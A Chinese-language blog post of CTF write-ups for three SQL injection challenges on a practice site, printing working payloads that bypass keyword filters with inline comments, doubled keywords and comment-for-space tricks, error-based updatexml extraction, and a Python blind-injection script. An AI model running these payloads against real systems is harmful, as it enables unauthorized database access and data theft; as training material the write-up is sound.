---
title: 实验吧 web writeup
date: 2018-04-18 19:03:31
tags:
---
本篇博客连续更新实验吧的web篇解题思路。
<!--more -->


# 简单的SQL注入

在ID框 输入1，有返回信息。

	ID: 1
	name: baloteli

输入 `'`，报错。

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

然后输入所有关键字信息，看到底过滤了什么。

```
1 and or union select from where = information_schema table_name table_schema column_name order by information_schema.tables --+ /**/ // # %00
```

得到信息：

	ID: 1 or   = information_schema table_name information_schema.tables    /**/ //

看来屏蔽了不少关键字。

对于过滤，可以考虑 `内联注释`、`双重关键字` 、 `大小写混用` 、 `编码` 。

`大小写混用` 不好使。


这里尝试注入 `1' or '1'='1`，得到正常信息，怀疑sql语句为：
```
select * from xx where id='xxx'
```

## 采用 `报错注入` + `内联注释` 方式。

### 内联注释

采用 `/*! code */` 来执行我们的SQL语句。


比如一个过滤器过滤了：
```
union,where, table_name, table_schema, =, and information_schema
```

这些都是我们内联注释需要绕过的目标。所以通常利用内联注释进行如下方式绕过：
```
id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
```

这里我们需要的语句是
```
1' or updatexml(1,concat('~',(select database() LIMIT 0,1),'~'),3) or '1'='1  
```

```
1' or updatexml(1,concat('~',(/*!select*/ database() LIMIT 0,1),'~'),3) or '1'='1  
```

得到反馈信息：

	XPATH syntax error: '~web1~'


查表名字：

```
1'or updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

```
1'or updatexml(1,concat('~',(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schema*/='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

这里报错了！

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '='web1' limit 0,1),'~'),3) or '1'='1'' at line 1

明明在前面的验证中， `table_schema` 是被过滤的呀，添加了内联注释也不行？

在尝试了`1 /*!table_schema*/` 之后发现，果然被过滤掉了。

那采取 `双重关键字` 。 `table_schema` 换成 `table_schtable_schemaema`

输入 `1 table_schtable_schemaema` 得到 `>ID: 1  table_schema`。很好。

```
1'or updatexml(1,concat('~',(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schtable_schemaema*/='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

拿到表格

	XPATH syntax error: '~flag~'

之后继续拿字段。
```
1'or updatexml(1,concat('~',(/*!select*/  column_name /*!from*/ information_schema.columns /*!where*/ table_name='flag' LIMIT 0,1),'~'),3) or '1'='1  
```

输入后，发现 `column_name` 、 `information_schema.columns` 都被过滤了，好奇怪。拿只好用 `双重关键字` 方法了。
```
1'or updatexml(1,concat('~',(/*!select*/  colucolumn_namemn_name  /*!from*/ infinformation_schema.columnsormation_schema.columns /*!where*/ table_name='flag' LIMIT 0,1),'~'),3) or '1'='1  
```

	XPATH syntax error: '~flag~'
得到表的字段：`flag`, `id`

直接获取 `flag`:

```
1'or updatexml(1,concat('~',(/*!select*/  flag  /*!from*/ flag LIMIT 0,1),'~'),3) or '1'='1
```

	XPATH syntax error: '~flag{Y0u_@r3_5O_dAmn_90Od}~'


## `双重关键字`

# 简单的SQL注入2

搞了半天就屏蔽了空格符号。那么把空格符替换掉就可以了。

```
1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'%3d'1
```

	ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: baloteli</pre><pre>ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: flag{Y0u_@r3_5O_dAmn_90Od}


# 简单的SQL注入3


字符型注入

布尔型盲注

```
1' and (select count(*) from flag)>0--+
1' and (select ascii(substr(flag,1,1)) from flag limit 0,1)>97--+
```


```
import requests
import string

url="http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (select length(flag) from flag limit 0,1)={0}--+"
url2="http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (select ascii(substr(flag,{0},1)) from flag limit 0,1)={1}--+"
'''
i=0
while True:
        i+=1
        res=requests.get(url.format(i))
        if res.content.find("Hello!")!= -1:
                print "Found it, i=",i
                break
        print "Not found, i=",i

Found it, i= 26
'''
printable=string.printable
print "printable is ",printable
result=""
for i in range(26):
        print "Now i=",i+1
        for c in (printable):
                res=requests.get(url2.format(i+1, ord(c)))
                if res.content.find("Hello!")!= -1:
                        print "Found it, i=",i+1, "char is ", c
                        result+=c
                        break
print "result is " , result

```



# 参考
- [西普实验吧CTF解题Writeup大全](http://hebin.me/2017/09/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E8%A7%A3%E9%A2%98writeup%E5%A4%A7%E5%85%A8/)
